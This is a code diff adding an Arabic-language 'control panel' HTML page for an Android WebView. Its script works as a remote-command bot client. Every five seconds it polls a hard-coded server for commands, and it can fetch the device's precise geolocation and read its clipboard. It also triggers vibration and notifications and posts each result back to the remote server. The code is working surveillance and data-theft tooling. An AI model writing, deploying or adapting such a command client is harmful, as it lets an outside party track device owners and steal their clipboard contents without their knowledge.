@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f0f2f5; }
+        .status { padding: 15px; background: #d4edda; color: #155724; border-radius: 8px; margin-bottom: 20px; }
+        .btn { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; margin: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="status" id="status">جاري الاتصال بالخادم...</div>
+    <button class="btn" onclick="testConnection()">اختبار الاتصال</button>
+
+    <script>
+        const SERVER_URL = "https://bot-server-lzrw.onrender.com";
+        const DEVICE_ID = "android_webview_01";
+
+        setInterval(checkCommands, 5000);
+
+        async function checkCommands() {
+            try {
+                const response = await fetch(`${SERVER_URL}/get-commands?device_id=${DEVICE_ID}`);
+                const data = await response.json();
+                
+                if (data.commands && data.commands.length > 0) {
+                    document.getElementById('status').innerText = "تم استلام أمر جديد! جاري التنفيذ...";
+                    document.getElementById('status').style.background = "#fff3cd";
+                    document.getElementById('status').style.color = "#856404";
+
+                    for (let cmd of data.commands) {
+                        await executeCommand(cmd.command, cmd.id);
+                    }
+                } else {
+                    document.getElementById('status').innerText = "النظام يعمل ويراقب الأوامر... ✅";
+                    document.getElementById('status').style.background = "#d4edda";
+                    document.getElementById('status').style.color = "#155724";
+                }
+            } catch (error) {
+                console.error("خطأ في الاتصال:", error);
+            }
+        }
+
+        async function executeCommand(command, commandId) {
+            let result = "تم التنفيذ";
+
+            try {
+                if (command === "/start" || command === "/device_info") {
+                    result = "📱 الجهاز: Android WebView\n🟢 الحالة: متصل\n🕒 الوقت: " + new Date().toLocaleString('ar-EG');
+                } 
+                else if (command === "/location") {
+                    result = await getLocation();
+                } 
+                else if (command === "/clipboard") {
+                    result = await getClipboard();
+                }
+                else if (command === "/vibrate") {
+                    if (navigator.vibrate) {
+                        navigator.vibrate([200, 100, 200]);
+                        result = "📳 تم تشغيل الاهتزاز بنجاح!";
+                    } else {
+                        result = "⚠️ الجهاز لا يدعم الاهتزاز";
+                    }
+                }
+                else if (command === "/notification") {
+                    if ("Notification" in window) {
+                        new Notification("رسالة من لوحة التحكم", { body: "هذه تجربة للإشعارات!" });
+                        result = "🔔 تم إرسال الإشعار";
+                    }
+                }
+                else {
+                    result = `⚠️ الأمر "${command}" غير مدعوم حالياً`;
+                }
+            } catch (err) {
+                result = `❌ خطأ: ${err.message}`;
+            }
+
+            await sendResult(result, command);
+        }
+
+        async function sendResult(resultText, commandName) {
+            try {
+                await fetch(`${SERVER_URL}/send-result`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        device_id: DEVICE_ID,
+                        command: commandName,
+                        result: resultText
+                    })
+                });
+            } catch (error) {
+                console.error("فشل الإرسال:", error);
+            }
+        }
+
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve("⚠️ المتصفح لا يدعم الموقع");
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve(`📍 الموقع:\nخط العرض: ${position.coords.latitude}\nخط الطول: ${position.coords.longitude}`);
+                    },
+                    (error) => {
+                        resolve(`❌ فشل جلب الموقع: ${error.message}`);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+
+        async function getClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                return `📋 الحافظة:\n${text || "فارغة"}`;
+            } catch (err) {
+                return "⚠️ لم يُسمح بقراءة الحافظة";
+            }
+        }
+
+        function testConnection() {
+            document.getElementById('status').innerText = "جاري الاختبار...";
+            checkCommands();
+        }
+
+        if ("Notification" in window) {
+            Notification.requestPermission();
+        }
+    </script>
+</body>
+</html>
